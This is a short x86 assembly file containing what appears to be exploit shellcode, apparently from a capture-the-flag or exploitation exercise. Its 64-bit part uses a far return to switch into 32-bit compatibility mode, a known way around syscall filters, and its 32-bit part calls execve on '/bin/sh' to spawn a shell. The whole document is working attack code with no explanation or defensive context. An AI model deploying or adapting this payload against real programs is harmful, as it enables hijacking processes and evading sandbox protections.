global main

main:
BITS 64
	xor rsp, rsp
	mov esp, 0x404088
	mov QWORD [rsp+8], rsp
	mov DWORD [rsp], 0x6942001d
	mov DWORD [rsp+4], 0x23
	retf

BITS 32
        push 0x0068732f
        push 0x6e69622f
        mov ebx, esp
        xor edx, edx
        push edx
        push ebx
        mov ecx, esp
        mov eax, 11
        int 0x80
